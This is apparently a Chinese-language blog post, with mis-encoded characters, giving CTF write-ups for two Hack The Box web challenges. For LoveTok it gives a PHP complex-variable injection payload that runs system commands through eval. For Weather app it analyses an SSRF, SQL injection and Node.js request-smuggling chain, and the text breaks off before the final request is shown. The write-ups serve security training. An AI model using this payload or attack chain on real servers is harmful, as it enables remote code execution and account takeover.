<!DOCTYPE html><html lang="zh-Hans"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="Hack the box web æŒ‘æˆ˜"><meta name="keywords" content="wp,web"><meta name="author" content="Alex"><meta name="copyright" content="Alex"><title>Hack the box web æŒ‘æˆ˜ | Alex's blog~</title><meta name="robots" content="noindex"><link rel="shortcut icon" href="/melody-favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.9.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.9.0"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script src="https://v1.hitokoto.cn/?encode=js&amp;charset=utf-8&amp;select=.footer_custom_text" defer></script><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  copy: {
    success: 'å¤åˆ¶æˆåŠŸ',
    error: 'å¤åˆ¶é”™è¯¯',
    noSupport: 'æµè§ˆå™¨ä¸æ”¯æŒ'
  },
  hexoVersion: '5.4.0'
} </script><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Alex's blog~" type="application/atom+xml">
</head><body><canvas class="fireworks"></canvas><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="true"><div class="toggle-sidebar-info text-center"><span data-toggle="åˆ‡æ¢æ–‡ç« è¯¦æƒ…">åˆ‡æ¢ç«™ç‚¹æ¦‚è§ˆ</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">ç›®å½•</div><div class="sidebar-toc__progress"><span class="progress-notice">ä½ å·²ç»è¯»äº†</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#LoveTok"><span class="toc-number">1.</span> <span class="toc-text">LoveTok</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Weather-app"><span class="toc-number">2.</span> <span class="toc-text">Weather app</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B7%AF%E7%94%B1%E4%B8%8E%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">2.1.</span> <span class="toc-text">è·¯ç”±ä¸æ¼æ´åˆ†æ</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#register%E8%B7%AF%E7%94%B1"><span class="toc-number">2.1.1.</span> <span class="toc-text">registerè·¯ç”±</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#login%E8%B7%AF%E7%94%B1"><span class="toc-number">2.1.2.</span> <span class="toc-text">loginè·¯ç”±</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#weather-api%E8%B7%AF%E7%94%B1"><span class="toc-number">2.1.3.</span> <span class="toc-text">weather-apiè·¯ç”±</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">2.2.</span> <span class="toc-text">æ¼æ´åˆ©ç”¨</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E6%BC%8F%E6%B4%9E%E6%BC%94%E7%A4%BA"><span class="toc-number">2.2.1.</span> <span class="toc-text">è¯·æ±‚èµ°ç§æ¼æ´æ¼”ç¤º</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8ssrf%E6%B3%A8%E5%86%8C%E4%B8%80%E4%B8%AA%E6%99%AE%E9%80%9A%E7%94%A8%E6%88%B7"><span class="toc-number">2.2.2.</span> <span class="toc-text">åˆ©ç”¨ssrfæ³¨å†Œä¸€ä¸ªæ™®é€šç”¨æˆ·</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5%E7%9A%84%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95"><span class="toc-number">2.2.3.</span> <span class="toc-text">sqlæ³¨å…¥çš„åˆ©ç”¨æ‰‹æ³•</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%84%E5%90%88%E6%8B%B3%E4%BF%AE%E6%94%B9admin%E5%AF%86%E7%A0%81"><span class="toc-number">2.2.4.</span> <span class="toc-text">ç»„åˆæ‹³ä¿®æ”¹adminå¯†ç </span></a></li></ol></li></ol></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="https://pic4.zhimg.com/80/v2-5cb1e2bdc0644f9828029a94181f4542_1440w.jpg"></div><div class="author-info__name text-center">Alex</div><div class="author-info__description text-center">pwn</div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">æ–‡ç« </span><span class="pull-right">60</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">æ ‡ç­¾</span><span class="pull-right">55</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">åˆ†ç±»</span><span class="pull-right">1</span></a></div><hr><div class="author-info-links"><div class="author-info-links__title text-center">Links</div><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="https://n0vice.top/">N0vice</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="http://snowywar.top/">é­”æ³•å°‘å¥³é›ªæ®‡</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="https://l0ne1y.xyz/">L0ne1y</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="http://eeeeeeeeeeeeeeeea.cn/">eeeeeeeeeeeeeeeea</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="https://giles-one.github.io/">cat03</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="https://ulrica66666.github.io/">ulrica66666</a></div></div></div><div id="content-outer"><div id="top-container" style="background-image: url(https://i.loli.net/2021/03/05/xqReclzVihJKGUu.jpg)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">Alex's blog~</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">Home</a><a class="site-page" href="/archives">æ–‡ç« </a><a class="site-page" href="/tags">æ ‡ç­¾</a><a class="site-page" href="/categories">åˆ†ç±»</a></span><span class="pull-right"></span></div><div id="post-info"><div id="post-title">Hack the box web æŒ‘æˆ˜</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2022-01-09</time></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><h2 id="LoveTok"><a href="#LoveTok" class="headerlink" title="LoveTok"></a>LoveTok</h2><blockquote>
<p>é¢˜ç›®æè¿°ï¼šTrue love is tough, and even harder to find. Once the sun has set, the lights close and the bell has rungâ€¦ you find yourself licking your wounds and contemplating human existence. You wish to have somebody important in your life to share the experiences that come with it, the good and the bad. This is why we made LoveTok, the brand new service that accurately predicts in the threshold of milliseconds when love will come knockinâ€™ (at your door). Come and check it out, but donâ€™t try to cheat love because love cheats back. ğŸ’›</p>
</blockquote>
<p>é¢˜ç›®ä¸»é¡µæœ‰ä¸ªé“¾æ¥å¯ä»¥ç‚¹ï¼Œä¼ å…¥äº†ä¸€ä¸ªformatå‚æ•°ï¼Œç”±äºé¢˜ç›®ç»™å‡ºæºç ä¾›ä¸‹è½½ï¼Œæˆ‘ä»¬ç›´æ¥ä»æºç é‡Œå®šä½ç›¸å…³ä½ç½®</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gy77vkfkk0j31pa0u0ajv.jpg" alt=""></p>
<p>åœ¨TimeControlleré‡Œé¢å¯ä»¥çœ‹åˆ°getä¼ æ¥çš„rå‚æ•°ï¼Œæˆ‘ä»¬ç»§ç»­è¿½è¸ª</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gy77yhmpq1j31200csdhk.jpg" alt=""></p>
<p>åœ¨TimeModelé‡Œé¢è¿½åˆ°äº†ä¸€ä¸ªgetTimeå‡½æ•°ï¼Œè°ƒç”¨äº†evalæ‰§è¡Œä»£ç ï¼Œå¹¶ä¸”å‚æ•°æ˜¯æˆ‘ä»¬ä¼ æ¥çš„å‚æ•°</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gy77zglfq7j31au0lctc4.jpg" alt=""></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TimeModel</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$format</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;format = addslashes(<span class="variable">$format</span>);</span><br><span class="line"></span><br><span class="line">        [ <span class="variable">$d</span>, <span class="variable">$h</span>, <span class="variable">$m</span>, <span class="variable">$s</span> ] = [ rand(<span class="number">1</span>, <span class="number">6</span>), rand(<span class="number">1</span>, <span class="number">23</span>), rand(<span class="number">1</span>, <span class="number">59</span>), rand(<span class="number">1</span>, <span class="number">69</span>) ];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;prediction = <span class="string">&quot;+$&#123;d&#125; day +$&#123;h&#125; hour +$&#123;m&#125; minute +$&#123;s&#125; second&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getTime</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&#x27;$time = date(&quot;&#x27;</span> . <span class="keyword">$this</span>-&gt;format . <span class="string">&#x27;&quot;, strtotime(&quot;&#x27;</span> . <span class="keyword">$this</span>-&gt;prediction . <span class="string">&#x27;&quot;));&#x27;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">isset</span>(<span class="variable">$time</span>) ? <span class="variable">$time</span> : <span class="string">&#x27;Something went terribly wrong&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ä½†æ˜¯æ³¨æ„åˆ°ï¼Œæœ‰ä¸€ä¸ªaddslashesä¼šå¯¹å•åŒå¼•å·è¿›è¡Œè¿‡æ»¤ï¼Œå› æ­¤æˆ‘ä»¬æ— æ³•é€šè¿‡å¸¸è§„çš„é—­åˆå¼•å·æ¥é€ƒé€¸å‘½ä»¤ã€‚</p>
<p>è¿™æ—¶å€™éœ€è¦ç”¨åˆ°PHPå¤æ‚å˜é‡çš„çŸ¥è¯†ï¼Œåœ¨PHPä¸­<code>$&#123;a&#125;</code>å¯ä»¥è¡¨ç¤ºä¸€ä¸ªå˜é‡ï¼Œç¤ºä¾‹ä»£ç å¦‚ä¸‹ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">  <span class="variable">$today</span> = <span class="string">&#x27;Monday&#x27;</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;Today is $&#123;today&#125;&quot;</span>;</span><br></pre></td></tr></table></figure>
<p>è¾“å‡ºç»“æœå¦‚ä¸‹ï¼š</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gy78aafykmj30b40240sk.jpg" alt=""></p>
<p>è€Œå¦‚æœé‡Œé¢è·Ÿçš„æ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œé‚£ä¹ˆå‡½æ•°å°†ä¼šè¢«æ‰§è¡Œã€‚</p>
<p>å…ˆæ¥çœ‹çœ‹é¡µé¢çš„phpinfo</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gy78hyqi4fj31cb0u07dj.jpg" alt=""></p>
<p>æŸ¥çœ‹å‘ç°æ²¡æœ‰banæ‰systemå‡½æ•°ï¼Œå› æ­¤å¯ä»¥ç”¨systemæ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤</p>
<p>payloadå¦‚ä¸‹ï¼š<code>?format=$&#123;system($_GET[0])&#125;&amp;0=ls ../</code></p>
<p>ä½¿ç”¨getä¼ å‚çš„æ–¹å¼æ¥æ‰§è¡Œå‘½ä»¤</p>
<p>æœ€ç»ˆå¯ä»¥æ‰§è¡Œå‘½ä»¤å¹¶è·å–åˆ°flag</p>
<h2 id="Weather-app"><a href="#Weather-app" class="headerlink" title="Weather app"></a>Weather app</h2><p>é¢˜ç›®æè¿°ï¼š</p>
<blockquote>
<p>A pit of eternal darkness, a mindless journey of abeyance, this feels like a never-ending dream. I think Iâ€™m hallucinating with the memories of my past life, itâ€™s a reflection of how thought I would have turned out if I had tried enough. A weatherman, I said! Someone my community would look up to, someone who is to be respected. I guess this is my way of telling you that Iâ€™ve been waiting for someone to come and save me. This weather application is notorious for trapping the souls of ambitious weathermen like me. Please defeat the evil bruxa thatâ€™s operating this website and set me free! ğŸ§™â€â™€ï¸</p>
</blockquote>
<p>é¢˜ç›®ç»™äº†dockerfileæ–‡ä»¶å’Œè·‘dockerçš„è„šæœ¬ï¼Œå…ˆæœ¬åœ°èµ·æ¥</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gydayjzegfj31lr0u0ad5.jpg" alt=""></p>
<p>ä»é¡µé¢ä¼¼ä¹æ— æ³•ç›´æ¥é˜…è¯»å‡ºæ¥ä¸€äº›æœ‰æ•ˆä¿¡æ¯ï¼Œæˆ‘ä»¬ç›´æ¥é˜…è¯»ç½‘ç«™çš„æºç ï¼Œæ‰¾åˆ°è·¯ç”±ç›¸å…³çš„æ–‡ä»¶ï¼Œå‘ç°å‡ æ¡é‡è¦çš„è·¯ç”±ï¼š</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">router.get(<span class="string">&#x27;/register&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">	<span class="keyword">return</span> res.sendFile(path.resolve(<span class="string">&#x27;views/register.html&#x27;</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">router.post(<span class="string">&#x27;/register&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (req.socket.remoteAddress.replace(<span class="regexp">/^.*:/</span>, <span class="string">&#x27;&#x27;</span>) != <span class="string">&#x27;127.0.0.1&#x27;</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span> res.status(<span class="number">401</span>).end();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">let</span> &#123; username, password &#125; = req.body;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (username &amp;&amp; password) &#123;</span><br><span class="line">		<span class="keyword">return</span> db.register(username, password)</span><br><span class="line">			.then(<span class="function">()  =&gt;</span> res.send(response(<span class="string">&#x27;Successfully registered&#x27;</span>)))</span><br><span class="line">			.catch(<span class="function">() =&gt;</span> res.send(response(<span class="string">&#x27;Something went wrong&#x27;</span>)));</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> res.send(response(<span class="string">&#x27;Missing parameters&#x27;</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">router.get(<span class="string">&#x27;/login&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">	<span class="keyword">return</span> res.sendFile(path.resolve(<span class="string">&#x27;views/login.html&#x27;</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">router.post(<span class="string">&#x27;/login&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">	<span class="keyword">let</span> &#123; username, password &#125; = req.body;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (username &amp;&amp; password) &#123;</span><br><span class="line">		<span class="keyword">return</span> db.isAdmin(username, password)</span><br><span class="line">			.then(<span class="function"><span class="params">admin</span> =&gt;</span> &#123;</span><br><span class="line">				<span class="keyword">if</span> (admin) <span class="keyword">return</span> res.send(fs.readFileSync(<span class="string">&#x27;/app/flag&#x27;</span>).toString());</span><br><span class="line">				<span class="keyword">return</span> res.send(response(<span class="string">&#x27;You are not admin&#x27;</span>));</span><br><span class="line">			&#125;)</span><br><span class="line">			.catch(<span class="function">() =&gt;</span> res.send(response(<span class="string">&#x27;Something went wrong&#x27;</span>)));</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> re.send(response(<span class="string">&#x27;Missing parameters&#x27;</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">router.post(<span class="string">&#x27;/api/weather&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">	<span class="keyword">let</span> &#123; endpoint, city, country &#125; = req.body;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (endpoint &amp;&amp; city &amp;&amp; country) &#123;</span><br><span class="line">		<span class="keyword">return</span> WeatherHelper.getWeather(res, endpoint, city, country);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> res.send(response(<span class="string">&#x27;Missing parameters&#x27;</span>));</span><br><span class="line">&#125;);	</span><br></pre></td></tr></table></figure>
<h3 id="è·¯ç”±ä¸æ¼æ´åˆ†æ"><a href="#è·¯ç”±ä¸æ¼æ´åˆ†æ" class="headerlink" title="è·¯ç”±ä¸æ¼æ´åˆ†æ"></a>è·¯ç”±ä¸æ¼æ´åˆ†æ</h3><h4 id="registerè·¯ç”±"><a href="#registerè·¯ç”±" class="headerlink" title="registerè·¯ç”±"></a>registerè·¯ç”±</h4><p>æˆ‘ä»¬é¦–å…ˆæ¥çœ‹registerç›¸å…³çš„è·¯ç”±ï¼š</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">router.get(<span class="string">&#x27;/register&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">	<span class="keyword">return</span> res.sendFile(path.resolve(<span class="string">&#x27;views/register.html&#x27;</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">router.post(<span class="string">&#x27;/register&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (req.socket.remoteAddress.replace(<span class="regexp">/^.*:/</span>, <span class="string">&#x27;&#x27;</span>) != <span class="string">&#x27;127.0.0.1&#x27;</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span> res.status(<span class="number">401</span>).end();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">let</span> &#123; username, password &#125; = req.body;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (username &amp;&amp; password) &#123;</span><br><span class="line">		<span class="keyword">return</span> db.register(username, password)</span><br><span class="line">			.then(<span class="function">()  =&gt;</span> res.send(response(<span class="string">&#x27;Successfully registered&#x27;</span>)))</span><br><span class="line">			.catch(<span class="function">() =&gt;</span> res.send(response(<span class="string">&#x27;Something went wrong&#x27;</span>)));</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> res.send(response(<span class="string">&#x27;Missing parameters&#x27;</span>));</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>å¯ä»¥å¾—åˆ°å¦‚ä¸‹ä¿¡æ¯ï¼š</p>
<ul>
<li>registerå®ç°äº†ä¸€ä¸ªæ³¨å†ŒåŠŸèƒ½</li>
<li><p>registerè·¯ç”±åªèƒ½ç”±æœåŠ¡å™¨æœ¬åœ°å‘èµ·è®¿é—®</p>
</li>
<li><p>æ³¨å†Œæ—¶è°ƒç”¨db.registeræ–¹æ³•ï¼Œå‚æ•°å¯æ§</p>
</li>
</ul>
<p>æˆ‘ä»¬è¿½è¿›å»registeræ–¹æ³•ï¼Œå¦‚ä¸‹ï¼š</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gydazq3di0j31di0kmae2.jpg" alt=""></p>
<p>å¯ä»¥çœ‹åˆ°sqlè¯­å¥ç›´æ¥å¯¹æˆ‘ä»¬ä¼ å…¥çš„å‚æ•°è¿›è¡Œæ‹¼æ¥ï¼Œå­˜åœ¨sqlæ³¨å…¥ã€‚</p>
<h4 id="loginè·¯ç”±"><a href="#loginè·¯ç”±" class="headerlink" title="loginè·¯ç”±"></a>loginè·¯ç”±</h4><p>loginç›¸å…³è·¯ç”±å¦‚ä¸‹ï¼š</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">router.get(<span class="string">&#x27;/login&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">	<span class="keyword">return</span> res.sendFile(path.resolve(<span class="string">&#x27;views/login.html&#x27;</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">router.post(<span class="string">&#x27;/login&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">	<span class="keyword">let</span> &#123; username, password &#125; = req.body;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (username &amp;&amp; password) &#123;</span><br><span class="line">		<span class="keyword">return</span> db.isAdmin(username, password)</span><br><span class="line">			.then(<span class="function"><span class="params">admin</span> =&gt;</span> &#123;</span><br><span class="line">				<span class="keyword">if</span> (admin) <span class="keyword">return</span> res.send(fs.readFileSync(<span class="string">&#x27;/app/flag&#x27;</span>).toString());</span><br><span class="line">				<span class="keyword">return</span> res.send(response(<span class="string">&#x27;You are not admin&#x27;</span>));</span><br><span class="line">			&#125;)</span><br><span class="line">			.catch(<span class="function">() =&gt;</span> res.send(response(<span class="string">&#x27;Something went wrong&#x27;</span>)));</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> re.send(response(<span class="string">&#x27;Missing parameters&#x27;</span>));</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>å¯ä»¥çœ‹åˆ°åªè¦ä»¥adminçš„èº«ä»½è¿›è¡Œç™»å½•å³å¯è·å¾—flagï¼Œç»“åˆæˆ‘ä»¬ä¸Šé¢å¯¹äºregisterè·¯ç”±çš„åˆ†æï¼Œç¬¬ä¸€ä¸ªæƒ³æ³•å°±æ˜¯æˆ‘ä»¬é€šè¿‡sqlæ³¨å…¥æ¥æŸ¥è¯¢å‡ºadminçš„å¯†ç ï¼Œä½†æ˜¯insertè¯­å¥å¹¶æ²¡æœ‰å›æ˜¾ï¼Œæ‰€ä»¥æˆ‘ä»¬å¾ˆè‡ªç„¶çš„å¯ä»¥æƒ³åˆ°é€šè¿‡insertè¯­å¥æ¥ä¿®æ”¹adminçš„å¯†ç ï¼Œå°†ä¸€ä¸ªéšæœºå€¼æ”¹ä¸ºå·²çŸ¥çš„å€¼ï¼Œä½†æ˜¯æˆ‘ä»¬è¿˜ç¼ºå°‘å¯ä»¥åˆ©ç”¨çš„æ¡ä»¶ï¼Œå› ä¸ºregisterè·¯ç”±ä»…å…è®¸æœåŠ¡å™¨ä»æœ¬åœ°è®¿é—®è¿™ä¸ªæ¥å£ã€‚</p>
<h4 id="weather-apiè·¯ç”±"><a href="#weather-apiè·¯ç”±" class="headerlink" title="weather-apiè·¯ç”±"></a>weather-apiè·¯ç”±</h4><p>å¤©æ°”æŸ¥è¯¢çš„apiè·¯ç”±å¦‚ä¸‹ï¼š</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">router.post(<span class="string">&#x27;/api/weather&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">	<span class="keyword">let</span> &#123; endpoint, city, country &#125; = req.body;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (endpoint &amp;&amp; city &amp;&amp; country) &#123;</span><br><span class="line">		<span class="keyword">return</span> WeatherHelper.getWeather(res, endpoint, city, country);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> res.send(response(<span class="string">&#x27;Missing parameters&#x27;</span>));</span><br><span class="line">&#125;);	</span><br></pre></td></tr></table></figure>
<p>æˆ‘ä»¬é¦–å…ˆè·å¾—äº†ä¸‰ä¸ªå‚æ•°ï¼Œæ³¨æ„ï¼Œè¿™ä¸‰ä¸ªå‚æ•°æ˜¯æˆ‘ä»¬å¯æ§çš„å‚æ•°ï¼Œç„¶åå°†å…¶ä¼ å…¥WeatherHelper.getWeatherå‡½æ•°ä¸­ï¼Œæˆ‘ä»¬è¿½è¸ªè¿›å…¥ç›¸å…³å‡½æ•°ï¼š</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gydb5hxjnqj31j60j0tcx.jpg" alt=""></p>
<p>å¯ä»¥çœ‹åˆ°æˆ‘ä»¬çš„å‚æ•°è¢«ä¼ å…¥åˆ°ä¸€ä¸ªurlé‡Œé¢åšæ‹¼æ¥ï¼Œå³æˆ‘ä»¬å‘èµ·çš„è¯·æ±‚æ˜¯å¯æ§çš„ï¼Œå­˜åœ¨ssrfæ¼æ´ã€‚</p>
<p>ä½†æ˜¯æ˜¯getè¯·æ±‚ï¼Œæ— æ³•è¾¾åˆ°æˆ‘ä»¬æƒ³è¦çš„å¯¹registeræ¥å£çš„postè¯·æ±‚ï¼Œè§‚å¯Ÿdockerfileæ–‡ä»¶</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> node:<span class="number">8.12</span>.<span class="number">0</span>-alpine</span><br><span class="line"></span><br><span class="line"><span class="comment"># Install packages</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> apk add --update --no-cache supervisor</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Setup app</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> mkdir -p /app</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Add application</span></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="bash"> /app</span></span><br><span class="line"><span class="keyword">COPY</span><span class="bash"> challenge .</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Install dependencies</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> npm install</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Setup superivsord</span></span><br><span class="line"><span class="keyword">COPY</span><span class="bash"> config/supervisord.conf /etc/supervisord.conf</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Expose the port node-js is reachable on</span></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">80</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Start the node-js application</span></span><br><span class="line"><span class="keyword">CMD</span><span class="bash"> [<span class="string">&quot;/usr/bin/supervisord&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;/etc/supervisord.conf&quot;</span>]</span></span><br></pre></td></tr></table></figure>
<p>å¯ä»¥å‘ç°ç¯å¢ƒä¸ºnode8.12ï¼Œnodejs 8.12å­˜åœ¨è¯·æ±‚èµ°ç§æ¼æ´ï¼Œåœ¨å‘èµ·è¯·æ±‚çš„æ—¶å€™ç”±äºå¯¹unicodeå­—ç¬¦å¤„ç†ä¸å½“ï¼Œå¯ä»¥è¢«ç”¨æ¥æ„é€ æ¢è¡Œç¬¦æ¥ä¿®æ”¹httpæµé‡ï¼Œå¤¹å¸¦ä¸€ä¸ªé¢å¤–çš„è¯·æ±‚ï¼Œå³â€è¯·æ±‚èµ°ç§â€œï¼Œå…·ä½“æ¼æ´åŸç†åœ¨<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2894">é€šè¿‡æ‹†åˆ†æ”»å‡»å®ç°çš„SSRFæ”»å‡»</a>ã€‚</p>
<h3 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h3><p>æ¼æ´åˆ©ç”¨çš„æ–¹å¼å°±æ¯”è¾ƒæ¸…æ™°äº†ï¼Œé¦–å…ˆåˆ©ç”¨ssrfæ¼æ´æ¥å¯¹registeræ¥å£å‘èµ·è¯·æ±‚ï¼Œç”±äºregisterè·¯ç”±å¯¹åº”çš„å¤„ç†å™¨å­˜åœ¨sqlæ³¨å…¥æ¼æ´ï¼Œé€šè¿‡sqlæ³¨å…¥ä¿®æ”¹adminçš„å¯†ç ï¼Œå³å¯æˆåŠŸæ‹¿åˆ°flagã€‚</p>
<h4 id="è¯·æ±‚èµ°ç§æ¼æ´æ¼”ç¤º"><a href="#è¯·æ±‚èµ°ç§æ¼æ´æ¼”ç¤º" class="headerlink" title="è¯·æ±‚èµ°ç§æ¼æ´æ¼”ç¤º"></a>è¯·æ±‚èµ°ç§æ¼æ´æ¼”ç¤º</h4><p>æˆ‘ä»¬å¼€ä¸€ä¸ªdockerä»¥åï¼Œç›‘å¬ä¸€ä¸ªæœ¬åœ°çš„5000ç«¯å£ï¼Œç„¶åä½¿ç”¨nodeå‘èµ·ä¸€ä¸ªgetè¯·æ±‚ã€‚</p>
<p>æ„é€ httpæŠ¥æ–‡å¦‚ä¸‹ï¼š</p>
